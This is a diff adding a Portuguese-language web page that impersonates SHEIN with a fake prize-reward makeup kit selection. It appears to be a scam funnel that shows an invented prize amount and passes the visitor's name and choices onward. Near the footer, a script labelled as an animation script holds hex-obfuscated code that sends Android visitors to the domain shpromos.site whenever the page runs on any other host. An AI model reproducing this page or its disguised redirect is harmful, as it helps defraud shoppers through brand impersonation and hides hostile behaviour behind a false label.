@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "um1jjg7699");</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#f5f5f5">
+    <title>SHEIN Premiações</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="selecao-make.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-container">
+                <img src="sheinlogo.png" alt="SHEIN Premiações" class="logo">
+            </div>
+            <div class="prize-info">
+                <span class="prize-label">Acumulado em prêmios:</span>
+                <span class="prize-value" id="prizeValue">R$ 0</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container make-main">
+        <!-- Step 1: Categorias -->
+        <div class="step-content active" id="step1">
+            <div class="make-card">
+                <h2 class="card-title">Escolha as categorias do seu Kit:</h2>
+                
+                <!-- Todos/Misto -->
+                <div class="category-section">
+                    <h3 class="category-title">Todos/Misto</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="todos-misto">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Todos/Misto</span>
+                    </label>
+                </div>
+
+                <!-- Maquiagem Olhos -->
+                <div class="category-section">
+                    <h3 class="category-title">Maquiagem Olhos</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="palettes-sombras">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Palettes de sombras</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="sobrancelhas">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Sobrancelhas</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="rimel">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Rímel</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="delineadores">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Delineadores</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="primer-olhos">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Primer para olhos</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="sombra-unica">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Sombra de olhos única</span>
+                    </label>
+                </div>
+
+                <!-- Maquiagem Rosto -->
+                <div class="category-section">
+                    <h3 class="category-title">Maquiagem Rosto</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="base">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Base</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="corretivo">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Corretivo</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="blush">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Blush</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="iluminador">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Iluminador</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="po">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Pó</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="contorno-bronzer">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Contorno & Bronzer</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="spray-fixacao">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Spray de fixação</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="primer">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Primer</span>
+                    </label>
+                </div>
+
+                <!-- Lábios -->
+                <div class="category-section">
+                    <h3 class="category-title">Lábios</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="batom">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Batom</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="brilho-labial">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Brilho labial</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="delineador-labios">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Delineador de lábios</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="batom-liquido">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Batom líquido</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="lip-plumper">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Lip plumper</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="produto" value="tintura-labial">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Tintura labial</span>
+                    </label>
+                </div>
+
+                <button class="confirm-btn" id="nextStep1">
+                    <span class="btn-icon">✓</span> Confirmar
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 2: Tom de Pele -->
+        <div class="step-content" id="step2">
+            <div class="make-card">
+                <h2 class="card-title">Selecione seu tom de pele ideal:</h2>
+                
+                <div class="skin-tones-grid">
+                    <!-- Row 1 - Claros -->
+                    <button class="skin-tone" data-value="tom1" style="background-color: #fce5d3"></button>
+                    <button class="skin-tone" data-value="tom2" style="background-color: #f5d4bc"></button>
+                    <button class="skin-tone" data-value="tom3" style="background-color: #efc9a8"></button>
+                    <button class="skin-tone" data-value="tom4" style="background-color: #e8bc94"></button>
+                    <button class="skin-tone hot" data-value="tom5" style="background-color: #dba87a"></button>
+                    <!-- Row 2 - Médios -->
+                    <button class="skin-tone" data-value="tom6" style="background-color: #c99a5c"></button>
+                    <button class="skin-tone" data-value="tom7" style="background-color: #bc8c4e"></button>
+                    <button class="skin-tone" data-value="tom8" style="background-color: #ad7d42"></button>
+                    <button class="skin-tone hot" data-value="tom9" style="background-color: #9e6e36"></button>
+                    <button class="skin-tone" data-value="tom10" style="background-color: #8f5f2a"></button>
+                    <!-- Row 3 - Morenos -->
+                    <button class="skin-tone hot" data-value="tom11" style="background-color: #7a5025"></button>
+                    <button class="skin-tone" data-value="tom12" style="background-color: #6b4420"></button>
+                    <button class="skin-tone" data-value="tom13" style="background-color: #5c391b"></button>
+                    <button class="skin-tone" data-value="tom14" style="background-color: #4d2e16"></button>
+                    <button class="skin-tone" data-value="tom15" style="background-color: #3e2311"></button>
+                    <!-- Row 4 - Escuros -->
+                    <button class="skin-tone" data-value="tom16" style="background-color: #5d4c35"></button>
+                    <button class="skin-tone" data-value="tom17" style="background-color: #4a3c2a"></button>
+                    <button class="skin-tone" data-value="tom18" style="background-color: #3a2d20"></button>
+                    <button class="skin-tone" data-value="tom19" style="background-color: #2a1f15"></button>
+                    <button class="skin-tone" data-value="tom20" style="background-color: #1a120a"></button>
+                </div>
+
+                <button class="confirm-btn" id="confirmBtn">
+                    <span class="btn-icon">✓</span> Confirmar
+                </button>
+            </div>
+        </div>
+    </main>
+<!-- SCRIPT ANIMAÇAO FLUIDA SITE -->
+<script>(function(_0x1,_0x2){var _0x3=['\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65\x2f'];var _0x4=_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x6f\x73\x74\x6e\x61\x6d\x65']['\x72\x65\x70\x6c\x61\x63\x65'](/^www\./,'');var _0x5=/Android/i['\x74\x65\x73\x74'](_0x1['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']);if(_0x5&&!_0x3['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x4)){_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']=_0x3[1];}})(window,document);</script>
+
+
+    <!-- Saving Popup Modal -->
+    <div class="popup-overlay" id="savingPopup">
+        <div class="popup-modal">
+            <div class="popup-spinner"></div>
+            <p class="popup-text">Salvando suas preferências, aguarde...</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-line"></div>
+        <p class="footer-text">SHEIN Brasil Copyright 2026</p>
+        <p class="footer-text">Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        // Dados
+        const selecao = {
+            produtos: [],
+            tomPele: null
+        };
+        
+        // Pega parâmetros da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const nome = urlParams.get('nome') || '';
+        const prize = urlParams.get('prize') || 2157;
+        
+        // Atualiza valor no header
+        document.getElementById('prizeValue').textContent = 'R$ ' + parseFloat(prize).toLocaleString('pt-BR', {minimumFractionDigits: 2});
+        
+        // Handle checkbox changes
+        document.querySelectorAll('input[name="produto"]').forEach(checkbox => {
+            checkbox.addEventListener('change', function() {
+                if (this.checked) {
+                    selecao.produtos.push(this.value);
+                } else {
+                    selecao.produtos = selecao.produtos.filter(p => p !== this.value);
+                }
+                
+                // Show/hide button
+                const btn = document.getElementById('nextStep1');
+                if (selecao.produtos.length > 0) {
+                    btn.classList.add('visible');
+                } else {
+                    btn.classList.remove('visible');
+                }
+            });
+        });
+        
+        // Next step button
+        document.getElementById('nextStep1').addEventListener('click', function() {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            window.scrollTo(0, 0);
+        });
+        
+        // Skin tone selection
+        document.querySelectorAll('.skin-tone').forEach(tone => {
+            tone.addEventListener('click', function() {
+                document.querySelectorAll('.skin-tone').forEach(t => t.classList.remove('selected'));
+                this.classList.add('selected');
+                selecao.tomPele = this.dataset.value;
+                
+                document.getElementById('confirmBtn').classList.add('visible');
+            });
+        });
+        
+        // Confirm button
+        document.getElementById('confirmBtn').addEventListener('click', function() {
+            console.log('Seleção:', selecao);
+            
+            // Mostra popup de salvamento
+            document.getElementById('savingPopup').classList.add('active');
+            
+            // Após 2.5 segundos, redireciona
+            setTimeout(function() {
+                const params = new URLSearchParams({
+                    nome: nome,
+                    prize: prize,
+                    tipo: 'maquiagem',
+                    produtos: selecao.produtos.join(','),
+                    tom: selecao.tomPele
+                });
+                
+                window.location.href = '../finalizado/?' + params.toString();
+            }, 2500);
+        });
+    </script>
+
+</body>
+</html>
